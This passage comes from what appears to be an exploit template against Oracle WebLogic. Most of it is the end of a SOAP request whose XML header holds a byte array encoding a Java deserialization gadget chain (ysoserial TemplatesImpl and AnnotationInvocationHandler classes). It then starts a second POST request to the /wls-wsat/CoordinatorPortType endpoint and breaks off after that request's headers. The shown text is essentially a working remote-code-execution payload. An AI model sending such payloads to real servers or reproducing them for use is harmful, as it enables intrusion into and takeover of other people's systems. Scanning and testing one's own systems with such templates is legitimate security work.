index="4142"><byte>-70</byte></void><void index="4143"><byte>-66</byte></void><void index="4144"><byte>0</byte></void><void index="4145"><byte>0</byte></void><void index="4146"><byte>0</byte></void><void index="4147"><byte>50</byte></void><void index="4148"><byte>0</byte></void><void index="4149"><byte>27</byte></void><void index="4150"><byte>10</byte></void><void index="4151"><byte>0</byte></void><void index="4152"><byte>3</byte></void><void index="4153"><byte>0</byte></void><void index="4154"><byte>21</byte></void><void index="4155"><byte>7</byte></void><void index="4156"><byte>0</byte></void><void index="4157"><byte>23</byte></void><void index="4158"><byte>7</byte></void><void index="4159"><byte>0</byte></void><void index="4160"><byte>24</byte></void><void index="4161"><byte>7</byte></void><void index="4162"><byte>0</byte></void><void index="4163"><byte>25</byte></void><void index="4164"><byte>1</byte></void><void index="4165"><byte>0</byte></void><void index="4166"><byte>16</byte></void><void index="4167"><byte>115</byte></void><void index="4168"><byte>101</byte></void><void index="4169"><byte>114</byte></void><void index="4170"><byte>105</byte></void><void index="4171"><byte>97</byte></void><void index="4172"><byte>108</byte></void><void index="4173"><byte>86</byte></void><void index="4174"><byte>101</byte></void><void index="4175"><byte>114</byte></void><void index="4176"><byte>115</byte></void><void index="4177"><byte>105</byte></void><void index="4178"><byte>111</byte></void><void index="4179"><byte>110</byte></void><void index="4180"><byte>85</byte></void><void index="4181"><byte>73</byte></void><void index="4182"><byte>68</byte></void><void index="4183"><byte>1</byte></void><void index="4184"><byte>0</byte></void><void index="4185"><byte>1</byte></void><void index="4186"><byte>74</byte></void><void index="4187"><byte>1</byte></void><void index="4188"><byte>0</byte></void><void index="4189"><byte>13</byte></void><void index="4190"><byte>67</byte></void><void index="4191"><byte>111</byte></void><void index="4192"><byte>110</byte></void><void index="4193"><byte>115</byte></void><void index="4194"><byte>116</byte></void><void index="4195"><byte>97</byte></void><void index="4196"><byte>110</byte></void><void index="4197"><byte>116</byte></void><void index="4198"><byte>86</byte></void><void index="4199"><byte>97</byte></void><void index="4200"><byte>108</byte></void><void index="4201"><byte>117</byte></void><void index="4202"><byte>101</byte></void><void index="4203"><byte>5</byte></void><void index="4204"><byte>113</byte></void><void index="4205"><byte>-26</byte></void><void index="4206"><byte>105</byte></void><void index="4207"><byte>-18</byte></void><void index="4208"><byte>60</byte></void><void index="4209"><byte>109</byte></void><void index="4210"><byte>71</byte></void><void index="4211"><byte>24</byte></void><void index="4212"><byte>1</byte></void><void index="4213"><byte>0</byte></void><void index="4214"><byte>6</byte></void><void index="4215"><byte>60</byte></void><void index="4216"><byte>105</byte></void><void index="4217"><byte>110</byte></void><void index="4218"><byte>105</byte></void><void index="4219"><byte>116</byte></void><void index="4220"><byte>62</byte></void><void index="4221"><byte>1</byte></void><void index="4222"><byte>0</byte></void><void index="4223"><byte>3</byte></void><void index="4224"><byte>40</byte></void><void index="4225"><byte>41</byte></void><void index="4226"><byte>86</byte></void><void index="4227"><byte>1</byte></void><void index="4228"><byte>0</byte></void><void index="4229"><byte>4</byte></void><void index="4230"><byte>67</byte></void><void index="4231"><byte>111</byte></void><void index="4232"><byte>100</byte></void><void index="4233"><byte>101</byte></void><void index="4234"><byte>1</byte></void><void index="4235"><byte>0</byte></void><void index="4236"><byte>15</byte></void><void index="4237"><byte>76</byte></void><void index="4238"><byte>105</byte></void><void index="4239"><byte>110</byte></void><void index="4240"><byte>101</byte></void><void index="4241"><byte>78</byte></void><void index="4242"><byte>117</byte></void><void index="4243"><byte>109</byte></void><void index="4244"><byte>98</byte></void><void index="4245"><byte>101</byte></void><void index="4246"><byte>114</byte></void><void index="4247"><byte>84</byte></void><void index="4248"><byte>97</byte></void><void index="4249"><byte>98</byte></void><void index="4250"><byte>108</byte></void><void index="4251"><byte>101</byte></void><void index="4252"><byte>1</byte></void><void index="4253"><byte>0</byte></void><void index="4254"><byte>18</byte></void><void index="4255"><byte>76</byte></void><void index="4256"><byte>111</byte></void><void index="4257"><byte>99</byte></void><void index="4258"><byte>97</byte></void><void index="4259"><byte>108</byte></void><void index="4260"><byte>86</byte></void><void index="4261"><byte>97</byte></void><void index="4262"><byte>114</byte></void><void index="4263"><byte>105</byte></void><void index="4264"><byte>97</byte></void><void index="4265"><byte>98</byte></void><void index="4266"><byte>108</byte></void><void index="4267"><byte>101</byte></void><void index="4268"><byte>84</byte></void><void index="4269"><byte>97</byte></void><void index="4270"><byte>98</byte></void><void index="4271"><byte>108</byte></void><void index="4272"><byte>101</byte></void><void index="4273"><byte>1</byte></void><void index="4274"><byte>0</byte></void><void index="4275"><byte>4</byte></void><void index="4276"><byte>116</byte></void><void index="4277"><byte>104</byte></void><void index="4278"><byte>105</byte></void><void index="4279"><byte>115</byte></void><void index="4280"><byte>1</byte></void><void index="4281"><byte>0</byte></void><void index="4282"><byte>3</byte></void><void index="4283"><byte>70</byte></void><void index="4284"><byte>111</byte></void><void index="4285"><byte>111</byte></void><void index="4286"><byte>1</byte></void><void index="4287"><byte>0</byte></void><void index="4288"><byte>12</byte></void><void index="4289"><byte>73</byte></void><void index="4290"><byte>110</byte></void><void index="4291"><byte>110</byte></void><void index="4292"><byte>101</byte></void><void index="4293"><byte>114</byte></void><void index="4294"><byte>67</byte></void><void index="4295"><byte>108</byte></void><void index="4296"><byte>97</byte></void><void index="4297"><byte>115</byte></void><void index="4298"><byte>115</byte></void><void index="4299"><byte>101</byte></void><void index="4300"><byte>115</byte></void><void index="4301"><byte>1</byte></void><void index="4302"><byte>0</byte></void><void index="4303"><byte>37</byte></void><void index="4304"><byte>76</byte></void><void index="4305"><byte>121</byte></void><void index="4306"><byte>115</byte></void><void index="4307"><byte>111</byte></void><void index="4308"><byte>115</byte></void><void index="4309"><byte>101</byte></void><void index="4310"><byte>114</byte></void><void index="4311"><byte>105</byte></void><void index="4312"><byte>97</byte></void><void index="4313"><byte>108</byte></void><void index="4314"><byte>47</byte></void><void index="4315"><byte>112</byte></void><void index="4316"><byte>97</byte></void><void index="4317"><byte>121</byte></void><void index="4318"><byte>108</byte></void><void index="4319"><byte>111</byte></void><void index="4320"><byte>97</byte></void><void index="4321"><byte>100</byte></void><void index="4322"><byte>115</byte></void><void index="4323"><byte>47</byte></void><void index="4324"><byte>117</byte></void><void index="4325"><byte>116</byte></void><void index="4326"><byte>105</byte></void><void index="4327"><byte>108</byte></void><void index="4328"><byte>47</byte></void><void index="4329"><byte>71</byte></void><void index="4330"><byte>97</byte></void><void index="4331"><byte>100</byte></void><void index="4332"><byte>103</byte></void><void index="4333"><byte>101</byte></void><void index="4334"><byte>116</byte></void><void index="4335"><byte>115</byte></void><void index="4336"><byte>36</byte></void><void index="4337"><byte>70</byte></void><void index="4338"><byte>111</byte></void><void index="4339"><byte>111</byte></void><void index="4340"><byte>59</byte></void><void index="4341"><byte>1</byte></void><void index="4342"><byte>0</byte></void><void index="4343"><byte>10</byte></void><void index="4344"><byte>83</byte></void><void index="4345"><byte>111</byte></void><void index="4346"><byte>117</byte></void><void index="4347"><byte>114</byte></void><void index="4348"><byte>99</byte></void><void index="4349"><byte>101</byte></void><void index="4350"><byte>70</byte></void><void index="4351"><byte>105</byte></void><void index="4352"><byte>108</byte></void><void index="4353"><byte>101</byte></void><void index="4354"><byte>1</byte></void><void index="4355"><byte>0</byte></void><void index="4356"><byte>12</byte></void><void index="4357"><byte>71</byte></void><void index="4358"><byte>97</byte></void><void index="4359"><byte>100</byte></void><void index="4360"><byte>103</byte></void><void index="4361"><byte>101</byte></void><void index="4362"><byte>116</byte></void><void index="4363"><byte>115</byte></void><void index="4364"><byte>46</byte></void><void index="4365"><byte>106</byte></void><void index="4366"><byte>97</byte></void><void index="4367"><byte>118</byte></void><void index="4368"><byte>97</byte></void><void index="4369"><byte>12</byte></void><void index="4370"><byte>0</byte></void><void index="4371"><byte>10</byte></void><void index="4372"><byte>0</byte></void><void index="4373"><byte>11</byte></void><void index="4374"><byte>7</byte></void><void index="4375"><byte>0</byte></void><void index="4376"><byte>26</byte></void><void index="4377"><byte>1</byte></void><void index="4378"><byte>0</byte></void><void index="4379"><byte>35</byte></void><void index="4380"><byte>121</byte></void><void index="4381"><byte>115</byte></void><void index="4382"><byte>111</byte></void><void index="4383"><byte>115</byte></void><void index="4384"><byte>101</byte></void><void index="4385"><byte>114</byte></void><void index="4386"><byte>105</byte></void><void index="4387"><byte>97</byte></void><void index="4388"><byte>108</byte></void><void index="4389"><byte>47</byte></void><void index="4390"><byte>112</byte></void><void index="4391"><byte>97</byte></void><void index="4392"><byte>121</byte></void><void index="4393"><byte>108</byte></void><void index="4394"><byte>111</byte></void><void index="4395"><byte>97</byte></void><void index="4396"><byte>100</byte></void><void index="4397"><byte>115</byte></void><void index="4398"><byte>47</byte></void><void index="4399"><byte>117</byte></void><void index="4400"><byte>116</byte></void><void index="4401"><byte>105</byte></void><void index="4402"><byte>108</byte></void><void index="4403"><byte>47</byte></void><void index="4404"><byte>71</byte></void><void index="4405"><byte>97</byte></void><void index="4406"><byte>100</byte></void><void index="4407"><byte>103</byte></void><void index="4408"><byte>101</byte></void><void index="4409"><byte>116</byte></void><void index="4410"><byte>115</byte></void><void index="4411"><byte>36</byte></void><void index="4412"><byte>70</byte></void><void index="4413"><byte>111</byte></void><void index="4414"><byte>111</byte></void><void index="4415"><byte>1</byte></void><void index="4416"><byte>0</byte></void><void index="4417"><byte>16</byte></void><void index="4418"><byte>106</byte></void><void index="4419"><byte>97</byte></void><void index="4420"><byte>118</byte></void><void index="4421"><byte>97</byte></void><void index="4422"><byte>47</byte></void><void index="4423"><byte>108</byte></void><void index="4424"><byte>97</byte></void><void index="4425"><byte>110</byte></void><void index="4426"><byte>103</byte></void><void index="4427"><byte>47</byte></void><void index="4428"><byte>79</byte></void><void index="4429"><byte>98</byte></void><void index="4430"><byte>106</byte></void><void index="4431"><byte>101</byte></void><void index="4432"><byte>99</byte></void><void index="4433"><byte>116</byte></void><void index="4434"><byte>1</byte></void><void index="4435"><byte>0</byte></void><void index="4436"><byte>20</byte></void><void index="4437"><byte>106</byte></void><void index="4438"><byte>97</byte></void><void index="4439"><byte>118</byte></void><void index="4440"><byte>97</byte></void><void index="4441"><byte>47</byte></void><void index="4442"><byte>105</byte></void><void index="4443"><byte>111</byte></void><void index="4444"><byte>47</byte></void><void index="4445"><byte>83</byte></void><void index="4446"><byte>101</byte></void><void index="4447"><byte>114</byte></void><void index="4448"><byte>105</byte></void><void index="4449"><byte>97</byte></void><void index="4450"><byte>108</byte></void><void index="4451"><byte>105</byte></void><void index="4452"><byte>122</byte></void><void index="4453"><byte>97</byte></void><void index="4454"><byte>98</byte></void><void index="4455"><byte>108</byte></void><void index="4456"><byte>101</byte></void><void index="4457"><byte>1</byte></void><void index="4458"><byte>0</byte></void><void index="4459"><byte>31</byte></void><void index="4460"><byte>121</byte></void><void index="4461"><byte>115</byte></void><void index="4462"><byte>111</byte></void><void index="4463"><byte>115</byte></void><void index="4464"><byte>101</byte></void><void index="4465"><byte>114</byte></void><void index="4466"><byte>105</byte></void><void index="4467"><byte>97</byte></void><void index="4468"><byte>108</byte></void><void index="4469"><byte>47</byte></void><void index="4470"><byte>112</byte></void><void index="4471"><byte>97</byte></void><void index="4472"><byte>121</byte></void><void index="4473"><byte>108</byte></void><void index="4474"><byte>111</byte></void><void index="4475"><byte>97</byte></void><void index="4476"><byte>100</byte></void><void index="4477"><byte>115</byte></void><void index="4478"><byte>47</byte></void><void index="4479"><byte>117</byte></void><void index="4480"><byte>116</byte></void><void index="4481"><byte>105</byte></void><void index="4482"><byte>108</byte></void><void index="4483"><byte>47</byte></void><void index="4484"><byte>71</byte></void><void index="4485"><byte>97</byte></void><void index="4486"><byte>100</byte></void><void index="4487"><byte>103</byte></void><void index="4488"><byte>101</byte></void><void index="4489"><byte>116</byte></void><void index="4490"><byte>115</byte></void><void index="4491"><byte>0</byte></void><void index="4492"><byte>33</byte></void><void index="4493"><byte>0</byte></void><void index="4494"><byte>2</byte></void><void index="4495"><byte>0</byte></void><void index="4496"><byte>3</byte></void><void index="4497"><byte>0</byte></void><void index="4498"><byte>1</byte></void><void index="4499"><byte>0</byte></void><void index="4500"><byte>4</byte></void><void index="4501"><byte>0</byte></void><void index="4502"><byte>1</byte></void><void index="4503"><byte>0</byte></void><void index="4504"><byte>26</byte></void><void index="4505"><byte>0</byte></void><void index="4506"><byte>5</byte></void><void index="4507"><byte>0</byte></void><void index="4508"><byte>6</byte></void><void index="4509"><byte>0</byte></void><void index="4510"><byte>1</byte></void><void index="4511"><byte>0</byte></void><void index="4512"><byte>7</byte></void><void index="4513"><byte>0</byte></void><void index="4514"><byte>0</byte></void><void index="4515"><byte>0</byte></void><void index="4516"><byte>2</byte></void><void index="4517"><byte>0</byte></void><void index="4518"><byte>8</byte></void><void index="4519"><byte>0</byte></void><void index="4520"><byte>1</byte></void><void index="4521"><byte>0</byte></void><void index="4522"><byte>1</byte></void><void index="4523"><byte>0</byte></void><void index="4524"><byte>10</byte></void><void index="4525"><byte>0</byte></void><void index="4526"><byte>11</byte></void><void index="4527"><byte>0</byte></void><void index="4528"><byte>1</byte></void><void index="4529"><byte>0</byte></void><void index="4530"><byte>12</byte></void><void index="4531"><byte>0</byte></void><void index="4532"><byte>0</byte></void><void index="4533"><byte>0</byte></void><void index="4534"><byte>47</byte></void><void index="4535"><byte>0</byte></void><void index="4536"><byte>1</byte></void><void index="4537"><byte>0</byte></void><void index="4538"><byte>1</byte></void><void index="4539"><byte>0</byte></void><void index="4540"><byte>0</byte></void><void index="4541"><byte>0</byte></void><void index="4542"><byte>5</byte></void><void index="4543"><byte>42</byte></void><void index="4544"><byte>-73</byte></void><void index="4545"><byte>0</byte></void><void index="4546"><byte>1</byte></void><void index="4547"><byte>-79</byte></void><void index="4548"><byte>0</byte></void><void index="4549"><byte>0</byte></void><void index="4550"><byte>0</byte></void><void index="4551"><byte>2</byte></void><void index="4552"><byte>0</byte></void><void index="4553"><byte>13</byte></void><void index="4554"><byte>0</byte></void><void index="4555"><byte>0</byte></void><void index="4556"><byte>0</byte></void><void index="4557"><byte>6</byte></void><void index="4558"><byte>0</byte></void><void index="4559"><byte>1</byte></void><void index="4560"><byte>0</byte></void><void index="4561"><byte>0</byte></void><void index="4562"><byte>0</byte></void><void index="4563"><byte>60</byte></void><void index="4564"><byte>0</byte></void><void index="4565"><byte>14</byte></void><void index="4566"><byte>0</byte></void><void index="4567"><byte>0</byte></void><void index="4568"><byte>0</byte></void><void index="4569"><byte>12</byte></void><void index="4570"><byte>0</byte></void><void index="4571"><byte>1</byte></void><void index="4572"><byte>0</byte></void><void index="4573"><byte>0</byte></void><void index="4574"><byte>0</byte></void><void index="4575"><byte>5</byte></void><void index="4576"><byte>0</byte></void><void index="4577"><byte>15</byte></void><void index="4578"><byte>0</byte></void><void index="4579"><byte>18</byte></void><void index="4580"><byte>0</byte></void><void index="4581"><byte>0</byte></void><void index="4582"><byte>0</byte></void><void index="4583"><byte>2</byte></void><void index="4584"><byte>0</byte></void><void index="4585"><byte>19</byte></void><void index="4586"><byte>0</byte></void><void index="4587"><byte>0</byte></void><void index="4588"><byte>0</byte></void><void index="4589"><byte>2</byte></void><void index="4590"><byte>0</byte></void><void index="4591"><byte>20</byte></void><void index="4592"><byte>0</byte></void><void index="4593"><byte>17</byte></void><void index="4594"><byte>0</byte></void><void index="4595"><byte>0</byte></void><void index="4596"><byte>0</byte></void><void index="4597"><byte>10</byte></void><void index="4598"><byte>0</byte></void><void index="4599"><byte>1</byte></void><void index="4600"><byte>0</byte></void><void index="4601"><byte>2</byte></void><void index="4602"><byte>0</byte></void><void index="4603"><byte>22</byte></void><void index="4604"><byte>0</byte></void><void index="4605"><byte>16</byte></void><void index="4606"><byte>0</byte></void><void index="4607"><byte>9</byte></void><void index="4608"><byte>112</byte></void><void index="4609"><byte>116</byte></void><void index="4610"><byte>0</byte></void><void index="4611"><byte>4</byte></void><void index="4612"><byte>80</byte></void><void index="4613"><byte>119</byte></void><void index="4614"><byte>110</byte></void><void index="4615"><byte>114</byte></void><void index="4616"><byte>112</byte></void><void index="4617"><byte>119</byte></void><void index="4618"><byte>1</byte></void><void index="4619"><byte>0</byte></void><void index="4620"><byte>120</byte></void><void index="4621"><byte>115</byte></void><void index="4622"><byte>125</byte></void><void index="4623"><byte>0</byte></void><void index="4624"><byte>0</byte></void><void index="4625"><byte>0</byte></void><void index="4626"><byte>1</byte></void><void index="4627"><byte>0</byte></void><void index="4628"><byte>29</byte></void><void index="4629"><byte>106</byte></void><void index="4630"><byte>97</byte></void><void index="4631"><byte>118</byte></void><void index="4632"><byte>97</byte></void><void index="4633"><byte>120</byte></void><void index="4634"><byte>46</byte></void><void index="4635"><byte>120</byte></void><void index="4636"><byte>109</byte></void><void index="4637"><byte>108</byte></void><void index="4638"><byte>46</byte></void><void index="4639"><byte>116</byte></void><void index="4640"><byte>114</byte></void><void index="4641"><byte>97</byte></void><void index="4642"><byte>110</byte></void><void index="4643"><byte>115</byte></void><void index="4644"><byte>102</byte></void><void index="4645"><byte>111</byte></void><void index="4646"><byte>114</byte></void><void index="4647"><byte>109</byte></void><void index="4648"><byte>46</byte></void><void index="4649"><byte>84</byte></void><void index="4650"><byte>101</byte></void><void index="4651"><byte>109</byte></void><void index="4652"><byte>112</byte></void><void index="4653"><byte>108</byte></void><void index="4654"><byte>97</byte></void><void index="4655"><byte>116</byte></void><void index="4656"><byte>101</byte></void><void index="4657"><byte>115</byte></void><void index="4658"><byte>120</byte></void><void index="4659"><byte>114</byte></void><void index="4660"><byte>0</byte></void><void index="4661"><byte>23</byte></void><void index="4662"><byte>106</byte></void><void index="4663"><byte>97</byte></void><void index="4664"><byte>118</byte></void><void index="4665"><byte>97</byte></void><void index="4666"><byte>46</byte></void><void index="4667"><byte>108</byte></void><void index="4668"><byte>97</byte></void><void index="4669"><byte>110</byte></void><void index="4670"><byte>103</byte></void><void index="4671"><byte>46</byte></void><void index="4672"><byte>114</byte></void><void index="4673"><byte>101</byte></void><void index="4674"><byte>102</byte></void><void index="4675"><byte>108</byte></void><void index="4676"><byte>101</byte></void><void index="4677"><byte>99</byte></void><void index="4678"><byte>116</byte></void><void index="4679"><byte>46</byte></void><void index="4680"><byte>80</byte></void><void index="4681"><byte>114</byte></void><void index="4682"><byte>111</byte></void><void index="4683"><byte>120</byte></void><void index="4684"><byte>121</byte></void><void index="4685"><byte>-31</byte></void><void index="4686"><byte>39</byte></void><void index="4687"><byte>-38</byte></void><void index="4688"><byte>32</byte></void><void index="4689"><byte>-52</byte></void><void index="4690"><byte>16</byte></void><void index="4691"><byte>67</byte></void><void index="4692"><byte>-53</byte></void><void index="4693"><byte>2</byte></void><void index="4694"><byte>0</byte></void><void index="4695"><byte>1</byte></void><void index="4696"><byte>76</byte></void><void index="4697"><byte>0</byte></void><void index="4698"><byte>1</byte></void><void index="4699"><byte>104</byte></void><void index="4700"><byte>116</byte></void><void index="4701"><byte>0</byte></void><void index="4702"><byte>37</byte></void><void index="4703"><byte>76</byte></void><void index="4704"><byte>106</byte></void><void index="4705"><byte>97</byte></void><void index="4706"><byte>118</byte></void><void index="4707"><byte>97</byte></void><void index="4708"><byte>47</byte></void><void index="4709"><byte>108</byte></void><void index="4710"><byte>97</byte></void><void index="4711"><byte>110</byte></void><void index="4712"><byte>103</byte></void><void index="4713"><byte>47</byte></void><void index="4714"><byte>114</byte></void><void index="4715"><byte>101</byte></void><void index="4716"><byte>102</byte></void><void index="4717"><byte>108</byte></void><void index="4718"><byte>101</byte></void><void index="4719"><byte>99</byte></void><void index="4720"><byte>116</byte></void><void index="4721"><byte>47</byte></void><void index="4722"><byte>73</byte></void><void index="4723"><byte>110</byte></void><void index="4724"><byte>118</byte></void><void index="4725"><byte>111</byte></void><void index="4726"><byte>99</byte></void><void index="4727"><byte>97</byte></void><void index="4728"><byte>116</byte></void><void index="4729"><byte>105</byte></void><void index="4730"><byte>111</byte></void><void index="4731"><byte>110</byte></void><void index="4732"><byte>72</byte></void><void index="4733"><byte>97</byte></void><void index="4734"><byte>110</byte></void><void index="4735"><byte>100</byte></void><void index="4736"><byte>108</byte></void><void index="4737"><byte>101</byte></void><void index="4738"><byte>114</byte></void><void index="4739"><byte>59</byte></void><void index="4740"><byte>120</byte></void><void index="4741"><byte>112</byte></void><void index="4742"><byte>115</byte></void><void index="4743"><byte>114</byte></void><void index="4744"><byte>0</byte></void><void index="4745"><byte>50</byte></void><void index="4746"><byte>115</byte></void><void index="4747"><byte>117</byte></void><void index="4748"><byte>110</byte></void><void index="4749"><byte>46</byte></void><void index="4750"><byte>114</byte></void><void index="4751"><byte>101</byte></void><void index="4752"><byte>102</byte></void><void index="4753"><byte>108</byte></void><void index="4754"><byte>101</byte></void><void index="4755"><byte>99</byte></void><void index="4756"><byte>116</byte></void><void index="4757"><byte>46</byte></void><void index="4758"><byte>97</byte></void><void index="4759"><byte>110</byte></void><void index="4760"><byte>110</byte></void><void index="4761"><byte>111</byte></void><void index="4762"><byte>116</byte></void><void index="4763"><byte>97</byte></void><void index="4764"><byte>116</byte></void><void index="4765"><byte>105</byte></void><void index="4766"><byte>111</byte></void><void index="4767"><byte>110</byte></void><void index="4768"><byte>46</byte></void><void index="4769"><byte>65</byte></void><void index="4770"><byte>110</byte></void><void index="4771"><byte>110</byte></void><void index="4772"><byte>111</byte></void><void index="4773"><byte>116</byte></void><void index="4774"><byte>97</byte></void><void index="4775"><byte>116</byte></void><void index="4776"><byte>105</byte></void><void index="4777"><byte>111</byte></void><void index="4778"><byte>110</byte></void><void index="4779"><byte>73</byte></void><void index="4780"><byte>110</byte></void><void index="4781"><byte>118</byte></void><void index="4782"><byte>111</byte></void><void index="4783"><byte>99</byte></void><void index="4784"><byte>97</byte></void><void index="4785"><byte>116</byte></void><void index="4786"><byte>105</byte></void><void index="4787"><byte>111</byte></void><void index="4788"><byte>110</byte></void><void index="4789"><byte>72</byte></void><void index="4790"><byte>97</byte></void><void index="4791"><byte>110</byte></void><void index="4792"><byte>100</byte></void><void index="4793"><byte>108</byte></void><void index="4794"><byte>101</byte></void><void index="4795"><byte>114</byte></void><void index="4796"><byte>85</byte></void><void index="4797"><byte>-54</byte></void><void index="4798"><byte>-11</byte></void><void index="4799"><byte>15</byte></void><void index="4800"><byte>21</byte></void><void index="4801"><byte>-53</byte></void><void index="4802"><byte>126</byte></void><void index="4803"><byte>-91</byte></void><void index="4804"><byte>2</byte></void><void index="4805"><byte>0</byte></void><void index="4806"><byte>2</byte></void><void index="4807"><byte>76</byte></void><void index="4808"><byte>0</byte></void><void index="4809"><byte>12</byte></void><void index="4810"><byte>109</byte></void><void index="4811"><byte>101</byte></void><void index="4812"><byte>109</byte></void><void index="4813"><byte>98</byte></void><void index="4814"><byte>101</byte></void><void index="4815"><byte>114</byte></void><void index="4816"><byte>86</byte></void><void index="4817"><byte>97</byte></void><void index="4818"><byte>108</byte></void><void index="4819"><byte>117</byte></void><void index="4820"><byte>101</byte></void><void index="4821"><byte>115</byte></void><void index="4822"><byte>116</byte></void><void index="4823"><byte>0</byte></void><void index="4824"><byte>15</byte></void><void index="4825"><byte>76</byte></void><void index="4826"><byte>106</byte></void><void index="4827"><byte>97</byte></void><void index="4828"><byte>118</byte></void><void index="4829"><byte>97</byte></void><void index="4830"><byte>47</byte></void><void index="4831"><byte>117</byte></void><void index="4832"><byte>116</byte></void><void index="4833"><byte>105</byte></void><void index="4834"><byte>108</byte></void><void index="4835"><byte>47</byte></void><void index="4836"><byte>77</byte></void><void index="4837"><byte>97</byte></void><void index="4838"><byte>112</byte></void><void index="4839"><byte>59</byte></void><void index="4840"><byte>76</byte></void><void index="4841"><byte>0</byte></void><void index="4842"><byte>4</byte></void><void index="4843"><byte>116</byte></void><void index="4844"><byte>121</byte></void><void index="4845"><byte>112</byte></void><void index="4846"><byte>101</byte></void><void index="4847"><byte>116</byte></void><void index="4848"><byte>0</byte></void><void index="4849"><byte>17</byte></void><void index="4850"><byte>76</byte></void><void index="4851"><byte>106</byte></void><void index="4852"><byte>97</byte></void><void index="4853"><byte>118</byte></void><void index="4854"><byte>97</byte></void><void index="4855"><byte>47</byte></void><void index="4856"><byte>108</byte></void><void index="4857"><byte>97</byte></void><void index="4858"><byte>110</byte></void><void index="4859"><byte>103</byte></void><void index="4860"><byte>47</byte></void><void index="4861"><byte>67</byte></void><void index="4862"><byte>108</byte></void><void index="4863"><byte>97</byte></void><void index="4864"><byte>115</byte></void><void index="4865"><byte>115</byte></void><void index="4866"><byte>59</byte></void><void index="4867"><byte>120</byte></void><void index="4868"><byte>112</byte></void><void index="4869"><byte>115</byte></void><void index="4870"><byte>114</byte></void><void index="4871"><byte>0</byte></void><void index="4872"><byte>17</byte></void><void index="4873"><byte>106</byte></void><void index="4874"><byte>97</byte></void><void index="4875"><byte>118</byte></void><void index="4876"><byte>97</byte></void><void index="4877"><byte>46</byte></void><void index="4878"><byte>117</byte></void><void index="4879"><byte>116</byte></void><void index="4880"><byte>105</byte></void><void index="4881"><byte>108</byte></void><void index="4882"><byte>46</byte></void><void index="4883"><byte>72</byte></void><void index="4884"><byte>97</byte></void><void index="4885"><byte>115</byte></void><void index="4886"><byte>104</byte></void><void index="4887"><byte>77</byte></void><void index="4888"><byte>97</byte></void><void index="4889"><byte>112</byte></void><void index="4890"><byte>5</byte></void><void index="4891"><byte>7</byte></void><void index="4892"><byte>-38</byte></void><void index="4893"><byte>-63</byte></void><void index="4894"><byte>-61</byte></void><void index="4895"><byte>22</byte></void><void index="4896"><byte>96</byte></void><void index="4897"><byte>-47</byte></void><void index="4898"><byte>3</byte></void><void index="4899"><byte>0</byte></void><void index="4900"><byte>2</byte></void><void index="4901"><byte>70</byte></void><void index="4902"><byte>0</byte></void><void index="4903"><byte>10</byte></void><void index="4904"><byte>108</byte></void><void index="4905"><byte>111</byte></void><void index="4906"><byte>97</byte></void><void index="4907"><byte>100</byte></void><void index="4908"><byte>70</byte></void><void index="4909"><byte>97</byte></void><void index="4910"><byte>99</byte></void><void index="4911"><byte>116</byte></void><void index="4912"><byte>111</byte></void><void index="4913"><byte>114</byte></void><void index="4914"><byte>73</byte></void><void index="4915"><byte>0</byte></void><void index="4916"><byte>9</byte></void><void index="4917"><byte>116</byte></void><void index="4918"><byte>104</byte></void><void index="4919"><byte>114</byte></void><void index="4920"><byte>101</byte></void><void index="4921"><byte>115</byte></void><void index="4922"><byte>104</byte></void><void index="4923"><byte>111</byte></void><void index="4924"><byte>108</byte></void><void index="4925"><byte>100</byte></void><void index="4926"><byte>120</byte></void><void index="4927"><byte>112</byte></void><void index="4928"><byte>63</byte></void><void index="4929"><byte>64</byte></void><void index="4930"><byte>0</byte></void><void index="4931"><byte>0</byte></void><void index="4932"><byte>0</byte></void><void index="4933"><byte>0</byte></void><void index="4934"><byte>0</byte></void><void index="4935"><byte>12</byte></void><void index="4936"><byte>119</byte></void><void index="4937"><byte>8</byte></void><void index="4938"><byte>0</byte></void><void index="4939"><byte>0</byte></void><void index="4940"><byte>0</byte></void><void index="4941"><byte>16</byte></void><void index="4942"><byte>0</byte></void><void index="4943"><byte>0</byte></void><void index="4944"><byte>0</byte></void><void index="4945"><byte>1</byte></void><void index="4946"><byte>116</byte></void><void index="4947"><byte>0</byte></void><void index="4948"><byte>8</byte></void><void index="4949"><byte>102</byte></void><void index="4950"><byte>53</byte></void><void index="4951"><byte>97</byte></void><void index="4952"><byte>53</byte></void><void index="4953"><byte>97</byte></void><void index="4954"><byte>54</byte></void><void index="4955"><byte>48</byte></void><void index="4956"><byte>56</byte></void><void index="4957"><byte>113</byte></void><void index="4958"><byte>0</byte></void><void index="4959"><byte>126</byte></void><void index="4960"><byte>0</byte></void><void index="4961"><byte>9</byte></void><void index="4962"><byte>120</byte></void><void index="4963"><byte>118</byte></void><void index="4964"><byte>114</byte></void><void index="4965"><byte>0</byte></void><void index="4966"><byte>29</byte></void><void index="4967"><byte>106</byte></void><void index="4968"><byte>97</byte></void><void index="4969"><byte>118</byte></void><void index="4970"><byte>97</byte></void><void index="4971"><byte>120</byte></void><void index="4972"><byte>46</byte></void><void index="4973"><byte>120</byte></void><void index="4974"><byte>109</byte></void><void index="4975"><byte>108</byte></void><void index="4976"><byte>46</byte></void><void index="4977"><byte>116</byte></void><void index="4978"><byte>114</byte></void><void index="4979"><byte>97</byte></void><void index="4980"><byte>110</byte></void><void index="4981"><byte>115</byte></void><void index="4982"><byte>102</byte></void><void index="4983"><byte>111</byte></void><void index="4984"><byte>114</byte></void><void index="4985"><byte>109</byte></void><void index="4986"><byte>46</byte></void><void index="4987"><byte>84</byte></void><void index="4988"><byte>101</byte></void><void index="4989"><byte>109</byte></void><void index="4990"><byte>112</byte></void><void index="4991"><byte>108</byte></void><void index="4992"><byte>97</byte></void><void index="4993"><byte>116</byte></void><void index="4994"><byte>101</byte></void><void index="4995"><byte>115</byte></void><void index="4996"><byte>0</byte></void><void index="4997"><byte>0</byte></void><void index="4998"><byte>0</byte></void><void index="4999"><byte>0</byte></void><void index="5000"><byte>0</byte></void><void index="5001"><byte>0</byte></void><void index="5002"><byte>0</byte></void><void index="5003"><byte>0</byte></void><void index="5004"><byte>0</byte></void><void index="5005"><byte>0</byte></void><void index="5006"><byte>0</byte></void><void index="5007"><byte>120</byte></void><void index="5008"><byte>112</byte></void><void index="5009"><byte>120</byte></void></array></void></class></work:WorkContext></soapenv:Header><soapenv:Body></soapenv:Body></soapenv:Envelope>

```

### Step - 2

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: text/xml

